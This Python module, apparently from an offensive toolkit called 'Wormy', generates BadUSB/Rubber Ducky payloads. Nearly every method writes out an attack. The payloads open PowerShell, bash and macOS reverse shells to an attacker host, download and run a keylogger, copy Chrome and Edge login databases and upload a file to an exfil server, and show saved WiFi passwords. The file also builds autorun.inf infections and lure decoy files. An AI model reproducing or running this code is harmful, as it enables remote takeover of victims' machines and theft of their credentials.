"""USB/Physical Attack Modules — BadUSB and Rubber Ducky payload generation"""

import os
import sys
from typing import Dict, List, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger


class BadUSBGenerator:
    """Generate BadUSB / Rubber Ducky payload scripts for physical access attacks.

    Produces DuckyScript payloads that can be loaded onto USB Rubber Ducky,
    Bash Bunny, or compatible HID injection devices.
    """

    def __init__(self):
        self.ducky_commands = {
            "windows": self._windows_payloads(),
            "linux": self._linux_payloads(),
            "macos": self._macos_payloads(),
        }

    def generate_powershell_reverse_shell(
        self, lhost: str, lport: int, delay: int = 500
    ) -> str:
        """Generate DuckyScript for PowerShell reverse shell delivery"""
        ps_cmd = (
            f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc '
            f'$client=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});'
            f'$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};'
            f'while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;'
            f'$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);'
            f'$sendback=(iex $data 2>&1 | Out-String );'
            f'$sendback2=$sendback + "PS " + (pwd).Path + "> ";'
            f'$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);'
            f'$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};'
            f'$client.Close()'
        )
        return self._wrap_ducky(
            [
                f"DELAY {delay}",
                "GUI r",
                f"DELAY {delay}",
                f"STRING {ps_cmd[:256]}",
                "ENTER",
            ],
            "windows",
        )

    def generate_wifi_stealer(self, delay: int = 300) -> str:
        """Generate DuckyScript to extract saved WiFi passwords"""
        return self._wrap_ducky(
            [
                f"DELAY {delay}",
                "GUI r",
                f"DELAY {delay}",
                "STRING cmd /k netsh wlan show profiles | findstr Profile",
                "ENTER",
                f"DELAY 1000",
                "CTRL a",
                "CTRL c",
                f"DELAY 200",
                "ALT SPACE",
                "STRING e",
                f"DELAY 200",
                "CTRL v",
            ],
            "windows",
        )

    def generate_keylogger_installer(self, lhost: str, lport: int) -> str:
        """Generate DuckyScript to download and execute a keylogger"""
        url = f"http://{lhost}:{lport}/keylogger.exe"
        return self._wrap_ducky(
            [
                "DELAY 500",
                "GUI r",
                "DELAY 500",
                f"STRING powershell -NoP -NonI -W Hidden -Exec Bypass -c \"Invoke-WebRequest -Uri '{url}' -OutFile $env:TEMP\\k.exe; Start-Process $env:TEMP\\k.exe\"",
                "ENTER",
                "DELAY 2000",
                "GUI r",
                "DELAY 500",
                "STRING cmd /c del %TEMP%\\k.exe & exit",
                "ENTER",
            ],
            "windows",
        )

    def generate_linux_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate DuckyScript for Linux reverse shell via xterm"""
        return self._wrap_ducky(
            [
                "DELAY 500",
                "ALT F2",
                "DELAY 500",
                f"STRING xterm -e 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
                "ENTER",
            ],
            "linux",
        )

    def generate_macos_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate DuckyScript for macOS reverse shell via Terminal"""
        return self._wrap_ducky(
            [
                "DELAY 500",
                "GUI SPACE",
                "DELAY 500",
                "STRING Terminal",
                "ENTER",
                f"DELAY 1000",
                f"STRING bash -c 'exec 5<>/dev/tcp/{lhost}/{lport};cat <&5|while read l;do $l 2>&5 >&5;done'",
                "ENTER",
            ],
            "macos",
        )

    def generate_credential_stealer(self) -> str:
        """Generate DuckyScript to dump browser credentials"""
        script_path = "$env:TEMP\\d.ps1"
        ps_script = (
            '$files = @(); '
            '$paths = @("$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data",'
            '"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data"); '
            'foreach ($p in $paths) { if (Test-Path $p) { '
            '$files += @{path=$p; dest="$env:TEMP\\" + [IO.Path]::GetFileName($p)}; '
            'Copy-Item $p $files[-1][\"dest\"] } }; '
            'Write-Output ($files | ConvertTo-Json)'
        )
        return self._wrap_ducky(
            [
                "DELAY 500",
                "GUI r",
                "DELAY 500",
                f"STRING powershell -NoP -NonI -Exec Bypass -c \"{ps_script}\"",
                "ENTER",
                "DELAY 2000",
                "GUI r",
                "DELAY 500",
                "STRING cmd /c curl -F \"file=@%TEMP%\\d.ps1\" http://PAYLOAD_SERVER/exfil",
                "ENTER",
            ],
            "windows",
        )

    def _wrap_ducky(self, commands: List[str], os_type: str) -> str:
        header = ["REM Wormy BadUSB Payload", f"REM Target: {os_type}", "DEFAULT_DELAY 10"]
        return "\n".join(header + commands + ["REM --- End Payload ---"])

    def _windows_payloads(self) -> Dict:
        return {"name": "Windows", "run_key": "GUI r", "shell": "cmd"}

    def _linux_payloads(self) -> Dict:
        return {"name": "Linux", "run_key": "ALT F2", "shell": "xterm"}

    def _macos_payloads(self) -> Dict:
        return {"name": "macOS", "run_key": "GUI SPACE", "shell": "Terminal"}

    def save_payload(self, payload: str, filename: str = "payload.txt") -> str:
        """Save generated payload to file"""
        path = os.path.join("payloads", "usb", filename)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            f.write(payload)
        logger.success(f"BadUSB payload saved to {path}")
        return path


class USBInfection:
    """USB autorun infection — creates autorun.inf on writable USB volumes"""

    def create_autorun(self, payload_path: str, label: str = "WORK_FILES") -> str:
        """Create autorun.inf for USB drop"""
        content = (
            f"[AutoRun]\n"
            f"label={label}\n"
            f"open={payload_path}\n"
            f"action=Open folder to view files\n"
            f"shell\\open\\command={payload_path}\n"
            f"shell\\explore\\command={payload_path}\n"
        )
        return content

    def create_decoy_files(self, mount_path: str, count: int = 10):
        """Create decoy documents on USB to encourage opening"""
        decoy_names = [
            "salary_review_2026.xlsx",
            "network_diagrams.pptx",
            "passwords_old.txt",
            "vpn_config.ovpn",
            "ssh_keys_backup.tar.gz",
            "meeting_notes_q2.docx",
            "infrastructure_overview.pdf",
            "employee_records.db",
            "api_endpoints.txt",
            "database_schema.sql",
        ]
        os.makedirs(mount_path, exist_ok=True)
        for i in range(min(count, len(decoy_names))):
            path = os.path.join(mount_path, decoy_names[i])
            if not os.path.exists(path):
                with open(path, "w") as f:
                    f.write(f"[Decoy file - {decoy_names[i]}]\n")
        logger.info(f"Created {count} decoy files in {mount_path}")


if __name__ == "__main__":
    gen = BadUSBGenerator()
    payload = gen.generate_powershell_reverse_shell("192.168.1.100", 4444)
    gen.save_payload(payload)
    print(payload)
